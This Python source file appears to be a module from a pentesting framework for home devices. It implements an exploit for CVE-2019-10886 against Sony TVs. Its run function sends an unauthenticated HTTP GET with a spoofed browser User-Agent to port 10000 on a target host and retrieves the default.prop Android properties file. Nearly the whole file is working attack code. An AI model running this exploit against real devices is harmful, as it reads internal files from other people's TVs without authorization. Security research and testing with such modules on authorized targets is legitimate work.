import requests
from modules._module import Module
from utils.custom_print import print_info, print_error
from utildata.dataset_options import Option



class HomeModule(Module):

    def __init__(self):
        information = {"Name": "CVE-2019-10886",
                       "Description": "This module take advantage of the vulnerability that allows to get internal TV files over HTTP without authentication and retrieve Android properties from a Sony TV.",
                       "Author": "@josueencinar",
                       "Reference": "https://seclists.org/fulldisclosure/2019/Apr/32"}

        # -----------name-----default_value--description--required?
        options = {"rhost": Option.create(name="rhost", required=True)}

        # Constructor of the parent class
        super(HomeModule, self).__init__(information, options)

    # This function must be always implemented, it is called by the run option
    def run(self):
        url = f"http://{self.args['rhost']}:10000/contentshare/image/default.prop"
        headers = {
            'Content-Type':'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
        }
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            print(response.json())
        else:
            print_error(f"Response code: {response.status_code}")